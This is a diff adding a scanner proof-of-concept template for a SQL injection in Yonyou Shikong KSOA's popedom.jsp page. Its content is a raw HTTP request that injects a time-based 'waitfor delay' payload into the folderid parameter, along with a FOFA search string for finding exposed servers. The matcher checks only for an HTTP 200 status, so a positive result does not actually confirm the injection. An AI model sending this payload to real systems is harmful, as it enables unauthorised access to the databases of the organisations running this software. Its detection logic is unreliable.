@@ -1,0 +1,23 @@
+id: poc-lg8gcxifsyh888w9
+info:
+  name: 用友时空KSOA popedom.jsp 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lg8gcxifsyh888w9'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lg8gcxifsyh888w9
+    fofa: app="用友-时空KSOA"
+http:
+- raw:
+  - 'GET /km/popedom.jsp?folderid=1''%3Bwaitfor+delay+''0%3a0%3a5''--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/114.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
